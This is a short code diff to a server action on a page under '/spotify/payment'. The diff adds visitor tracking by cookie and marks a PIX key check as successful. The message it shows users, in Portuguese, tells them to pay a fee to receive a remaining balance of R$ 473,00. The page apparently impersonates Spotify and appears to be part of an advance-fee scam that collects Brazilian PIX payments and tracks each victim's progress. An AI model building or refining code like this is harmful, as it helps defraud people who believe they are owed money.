@@ -58,6 +58,8 @@ export const createPayment = actionClient
           keyPix = pixKey
         }
 
+        const userId = cookies().get('token')?.value!
+
 
         cookies().set('user_pix_key', pixKey, {
           path: '/',
@@ -72,8 +74,19 @@ export const createPayment = actionClient
         })
 
         if (pix) {
+
+
+          await db.tracking.create({
+            data: {
+              pageName: 'Pagina chave PIX',
+              pageUrl: '/spotify/payment',
+              userId
+            }
+          })
+
+
           return {
-            success: false,
+            success: true,
             message: 'Chave PIX validada, pague a taxa e receba o saldo restante de R$ 473,00.',
             errors: null,
           }
@@ -113,6 +126,13 @@ export const createPayment = actionClient
         //console.log(response.data)
 
 
+        await db.tracking.create({
+          data: {
+            pageName: 'Pagina chave PIX',
+            pageUrl: '/spotify/payment',
+            userId
+          }
+        })
 
         return {
           success: true,
